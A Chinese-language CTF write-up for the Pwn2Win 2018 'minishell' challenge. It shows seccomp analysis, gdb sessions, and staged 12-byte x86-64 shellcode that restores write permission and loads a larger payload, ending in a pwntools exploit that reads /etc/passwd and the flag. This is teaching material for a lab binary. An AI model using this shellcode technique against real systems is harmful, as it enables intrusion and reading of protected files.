# Minishell
## 題幹
> We figured out that the H1N337 viruses has a virtual variant too, and a sample has been encapsulated in this sandbox. Can you write a code to pass through the sandbox without being infected?

[minishell](./minishell)

## 初步分析
```bash
$ file minishell
minishell: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c9d3465b20917f8dca5d047d0054c7f6c5f5a60, stripped
$ strings minishell
/lib64/ld-linux-x86-64.so.2
...
libseccomp.so.2
...
seccomp_load
seccomp_release
seccomp_rule_add
seccomp_init
libc.so.6
exit
puts
stdin
printf
mmap
read
stdout
mprotect
alarm
...
seccomp error
So what?
too big!
Executing...!
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
...
$ checksec -f minishell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No	0		2	minishell
```
注意其中的seccomp，[seccomp学习笔记](https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)對其進行了很好的介紹。

## 試運行
```bash
$ ./minishell
So what? 123
Executing...!
Segmentation fault
$ ./minishell
So what? 123456789012345678901234567890
too big!
```

## IDA靜態分析
```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  void *buf; // [rsp+18h] [rbp-8h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  buf = mmap(0LL, 0x1000uLL, 7, 0x22, 0, 0LL);
  printf("So what? ", 4096LL, a2);
  if ( (signed int)read(0, buf, 0x1000uLL) > 12 )
  {
    puts("too big!");
    exit(0);
  }
  alarm(0x32u);
  puts("Executing...!");
  set_seccomp();
  mprotect(buf, 0x1000uLL, 5);
  JUMPOUT(__CS__, buf);
}
```
1. 創建一個buf，權限爲RWX(7)。
1. 讀入最多12個字節。
1. 設置buf權限爲RX(5)。
1. 執行buf中的shellcode。

## 確定攻擊思路
分析seccomp
```bash
$ seccomp-tools dump ./minishell
So what? 1
Executing...!
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x0000000a  if (A == mprotect) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```
只允許read，write，open，mprotect和exit系統調用。

首先利用12字節構造一個可進一步開展工作的shellcode，基本思想是12字節的shellcode明顯不夠用於取得flag，那麼首先用這個shellcode來注入更大的shellcode。
```gdb
$ gdb ./minishell -ex 'r'
gef➤  start
[+] Breaking at entry-point: 0x5555555549b0
gef➤  b mmap
gef➤  c
Continuing.
[#0] Id 1, Name: "minishell", stopped, reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7c92c10 → __GI___mmap64(addr=0x0, len=0x1000, prot=0x7, flags=0x22, fd=0x0, offset=0x0)
[#1] 0x555555554c5e → mov QWORD PTR [rbp-0x8], rax
[#2] 0x7ffff7bc2b17 → __libc_start_main(main=0x555555554bee, argc=0x1, argv=0x7fffffffd7e8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffd7d8)
[#3] 0x5555555549da → hlt
──────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  fin
gef➤  p/x $rax
$2 = 0x7ffff7fcf000
gef➤  c
Continuing.
So what? 1
Executing...!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7fcf000 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7c92d27  →  <mprotect+7> cmp rax, 0xfffffffffffff001
$rdx   : 0x5
$rsp   : 0x00007fffffffd6e0  →  0x00007fffffffd7e8  →  0x00007fffffffdc3a  →  "/home/lj/download/minishell"
$rbp   : 0x00007fffffffd700  →  0x0000555555554cf0  →   push r15
$rsi   : 0x1000
$rdi   : 0x00007ffff7fcf000  →  0x0000000000000a31 ("1"?)
$rip   : 0x00007ffff7fcf000  →  0x0000000000000a31 ("1"?)
$r8    : 0x6
$r9    : 0x0
$r10   : 0x1
...
```
首先應該運行mprotect(buf, 0x1000, 7)爲buf恢復W權限。注意到程序執行到shellcode時，rdi和rsi都已經是對的值了，只需要設置rdx=7即可。
```python
In [35]: import pwn
In [36]: pwn.context.arch = 'amd64'; pwn.context.os = 'linux'
In [37]: a = pwn.asm('mov rax, 10; mov rdx, 7; syscall'); a, len(a)
Out[37]: ('H\xc7\xc0\n\x00\x00\x00H\xc7\xc2\x07\x00\x00\x00\x0f\x05', 16)
In [38]: a = pwn.asm('add al, dl; mov dl, 7; syscall'); a, len(a)
Out[38]: ('\x00\xd0\xb2\x07\x0f\x05', 6)
```
用去了6字節，還剩6字節。要運行read(0, buf, size)
對比：
```
mprotect成功返回時: rax=0, rdi=buf, rsi=0x1000, rdx=7
read(0, buf, size): rax=0, rdi=0,   rsi=buf,    rdx=size
```
嘗試過程：
```python
In [53]: a = pwn.asm('mov al, 10; mov dl, 7; syscall; mov rsi, rdi; mov rdi, rax; syscall'); a, len(a)
Out[53]: ('\xb0\n\xb2\x07\x0f\x05H\x89\xfeH\x89\xc7\x0f\x05', 14)
In [54]: a = pwn.asm('mov al, 10; mov dl, 7; syscall; push rdi; pop rsi; push rax; pop rdi; syscall'); a, len(a)
Out[54]: ('\xb0\n\xb2\x07\x0f\x05W^P_\x0f\x05', 12)
In [57]: a = pwn.asm('mov al, 10; mov dl, 7; syscall; push rdi; pop rsi; push rax; pop rdi; syscall'); binascii.hexlify(a), len(a)
Out[57]: ('b00ab2070f05575e505f0f05', 12)
```
還最後一個`jmp rdi`沒有空間。

仔細觀察mprotect返回時寄存器的狀態：
```gdb
$ gdb ./minishell
gef➤  b *0x555555554cd9
Breakpoint 1 at 0x555555554cd9
gef➤  r
Starting program: /home/lj/download/minishell
So what? 1
Executing...!

gef➤  n
0x0000555555554cde in ?? ()
   0x555555554cd0                  add    BYTE PTR [rsi+0x1000], bh
   0x555555554cd6                  mov    rdi, rax
   0x555555554cd9                  call   0x555555554980 <mprotect@plt>
 → 0x555555554cde                  jmp    QWORD PTR [rbp-0x8]
   0x555555554ce1                  mov    eax, 0x0
   0x555555554ce6                  leave
   0x555555554ce7                  ret
   0x555555554ce8                  nop    DWORD PTR [rax+rax*1+0x0]
   0x555555554cf0                  push   r15
gef➤  xor-memory display 0x00007ffff7fcf000 12 8100b20f0f05575e505f0f05
[+] Displaying XOR-ing 0x7ffff7fcf000-0x7ffff7fcf00c with '8100b20f0f05575e505f0f05'
── Original block ───────────────────────────────────────────────────────────────────
0x00007ffff7fcf000     31 0a 00 00 00 00 00 00 00 00 00 00    1...........
─── XOR-ed block ────────────────────────────────────────────────────────────────────
0x00007ffff7fcf000     b0 0a b2 07 0f 05 57 5e 50 5f 0f 05    ......W^P_..
gef➤  xor-memory patch 0x00007ffff7fcf000 12 8100b2070f05575e505f0f05
[+] Patching XOR-ing 0x7ffff7fcf000-0x7ffff7fcf00c with '8100b2070f05575e505f0f05'
gef➤  n
 → 0x7ffff7fcf000                  mov    al, 0xa
   0x7ffff7fcf002                  mov    dl, 0xf
   0x7ffff7fcf004                  syscall
   0x7ffff7fcf006                  push   rdi
   0x7ffff7fcf007                  pop    rsi
   0x7ffff7fcf008                  push   rax
gef➤  n
 → 0x7ffff7fcf002                  mov    dl, 0xf
   0x7ffff7fcf004                  syscall
   0x7ffff7fcf006                  push   rdi
   0x7ffff7fcf007                  pop    rsi
   0x7ffff7fcf008                  push   rax
   0x7ffff7fcf009                  pop    rdi
gef➤  n
 → 0x7ffff7fcf004                  syscall
   0x7ffff7fcf006                  push   rdi
   0x7ffff7fcf007                  pop    rsi
   0x7ffff7fcf008                  push   rax
   0x7ffff7fcf009                  pop    rdi
   0x7ffff7fcf00a                  syscall
gef➤  n
──────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7fcf006  →  0x0000050f5f505e57
$rdx   : 0xf
$rsp   : 0x00007fffffffd6c0  →  0x00007fffffffd7c8  →  0x00007fffffffdc13  →  "/home/lj/download/minishell"
$rbp   : 0x00007fffffffd6e0  →  0x0000555555554cf0  →   push r15
$rsi   : 0x1000
$rdi   : 0x00007ffff7fcf000  →  0x5e57050f0fb20ab0
$rip   : 0x00007ffff7fcf006  →  0x0000050f5f505e57
$r8    : 0x6
$r9    : 0x0
$r10   : 0x1
────────────────────────────────────────────────────────────────── code:x86:64 ────
 → 0x7ffff7fcf006                  push   rdi
   0x7ffff7fcf007                  pop    rsi
gef➤
```
注意到此時rcx=buf+6，如果向這個地址寫而不是向buf寫（7個字節），那麼將額外得到1個字節。可是我們需要兩個。
```
In [45]: a = pwn.asm('jmp rdi'); a, len(a)
Out[45]: ('\xff\xe7', 2)
```
因爲接下來執行的是buf+12處的指令，讀入的前6個字節沒能發揮作用。要想個辦法用起來。重複利用前面的syscall指令，這樣就可以：
```
In [8]: a = pwn.asm('mov al, 10; mov dl, 7; a: syscall; push rcx; pop rsi; push rax; pop rdi; jmp a'); binascii.hexlify(a), len(a)
Out[8]: ('b00ab2070f05515e505febf8', 12)
In [9]: a = pwn.asm('mov al, 10; mov dl, 7; syscall'); binascii.hexlify(a), len(a)
Out[9]: ('b00ab2070f05', 6)
```
這樣，第二次執行syscall之後，pc指向buf+6。哈哈，正好執行新的shellcode，連jmp rdi都不用了。新的shellcode有7個字節，應該嘗試讀入更多shellcode
```
gef➤  s # 從jmp跳回此處執行
0x00007ffff7fcf004 in ?? ()
 → 0x7ffff7fcf004                  syscall
   0x7ffff7fcf006                  push   rcx
   0x7ffff7fcf007                  pop    rsi
   0x7ffff7fcf008                  push   rax
   0x7ffff7fcf009                  pop    rdi
   0x7ffff7fcf00a                  jmp    0x7ffff7fcf004
gef➤  s
1
0x00007ffff7fcf006 in ?? ()
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x2
$rbx   : 0x0
$rcx   : 0x00007ffff7fcf006  →  0x0000f8eb5f500a31
$rdx   : 0x7
$rsp   : 0x00007fffffffd770  →  0x00007fffffffd878  →  0x00007fffffffdca5  →  "/home/lj/ctf-notes/201812--pwn2win-ctf-2018/minish[...]"
$rbp   : 0x00007fffffffd790  →  0x0000555555554cf0  →   push r15
$rsi   : 0x00007ffff7fcf006  →  0x0000f8eb5f500a31
$rdi   : 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 → 0x7ffff7fcf006                  xor    DWORD PTR [rdx], ecx
   0x7ffff7fcf008                  push   rax
   0x7ffff7fcf009                  pop    rdi
   0x7ffff7fcf00a                  jmp    0x7ffff7fcf004
   0x7ffff7fcf00c                  add    BYTE PTR [rax], al
```
```
此時寄存器的狀態信息: rax=2, rdi=0, rsi=buf+6, rdx=7
read(0, buf+6, size): rax=0, rdi=0, rsi=buf+6, rdx=size
```

```python
In [24]: a = pwn.asm('a:syscall; xor al, al; mov dl, 0xff; jmp a'); binascii.hexlify(a[2:]), len(a)-2
Out[24]: ('30c0b2ffebf8', 6)
```
這次read就可以讀入足夠多的shellcode了。由於我們只能使用指定系統調用，所以先讀取/etc/passwd文件找到用戶minishell，然後再運行一遍讀取/home/minishell/flag.txt即可。

```python
import sys; from pwn import *

context.arch = 'amd64'; context.os = 'linux'

r = process('./minishell')
r.recvuntil('So what? ')

# mprotect(buf, len, PROC_RWX)
# read(0, buf+6, 7)
sc = "mov al, 0xa; mov dl, 0x7; a: syscall; push rcx; push rax; pop rdi; pop rsi; jmp a;"
assert len(asm(sc))==12
r.send(asm(sc))
sleep(0.5)

# read(0, buf+6, 0xff)
sc = "a: syscall; mov al, 0; mov dl, 0xff; jmp a;"
assert len(asm('syscall'))==2
assert len(asm(sc))==8
r.send(asm(sc)[2:] + 'A')
sleep(0.5)

# open('/etc/passwd')
# read(fd[rax], buf, 0x30)
# write(1, buf, 0x30)
# exit()
sc = """mov rax, 2; mov rdi, rsi; add rdi, 77; mov rsi, 0; mov rdx, 0; syscall;
        mov rsi, rdi; mov rdi, rax; mov rax, 0; mov rdx, 0xff; syscall;
        mov rax, 1; mov rdi, 1; syscall;
        mov rax, 60; syscall;"""
assert asm(sc)==77
r.sendline(asm(sc) + '/etc/passwd\x00')
print r.recvall()
```

另外，有人發現第一個shellcode中RWX設置還可以是15(7 | 8)，那就更加簡單了。詳見參考資料。該方法中第三階段的payload構造也很有意思，是將讀入的數據放在了堆棧上，並且使用了pwn的shellcraft庫。

## 收穫的小技巧
gdb進行調試時修改內存數據有如下幾種方式：
1. set {int}0x55555555=1
1. restore filename binary address（如restore data.bin binary 0x7ffffff7fcf006）
1. xor-memory patch addr size key
    1. 如xor-memory patch 0x55555555 12 ff
    1. 修改前可用xor-memory display預覽
    1. 再運行一次相同patch命令相當於撤銷更改
    1. gef命令，非gdb原生命令。
1. python API. `Inferior.wirte_memory`

## 參考資料
1. [seccomp学习笔记](https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
1. [Github seccomp-tools](https://github.com/david942j/seccomp-tools)
1. [參考WP](https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#minishell)
1. [參考WP2]
